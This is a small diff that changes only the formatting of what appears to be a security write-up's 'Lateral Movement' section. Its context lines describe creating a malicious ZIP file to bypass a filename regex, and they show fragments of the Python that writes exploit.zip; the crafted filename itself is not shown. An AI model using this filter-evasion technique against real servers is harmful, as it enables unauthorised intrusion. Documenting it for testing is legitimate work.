@@ -1793,6 +1793,7 @@ This script demonstrates that the server environment is configured to run Python
 
 ### 4.3 Lateral Movement
 
+
 To bypass the script's strict filename regex (`SAFE_NAME_REGEX`), create a malicious ZIP file locally.
 
 ```shell
@@ -1822,7 +1823,9 @@ with zipfile.ZipFile('exploit.zip', 'w') as zipf:
 print(f"Created exploit.zip with filename: {exploit_filename}")
 ```
 
-Logic:
+**Logic:**
+
+
 <div align="center">
 <br>
 <br>
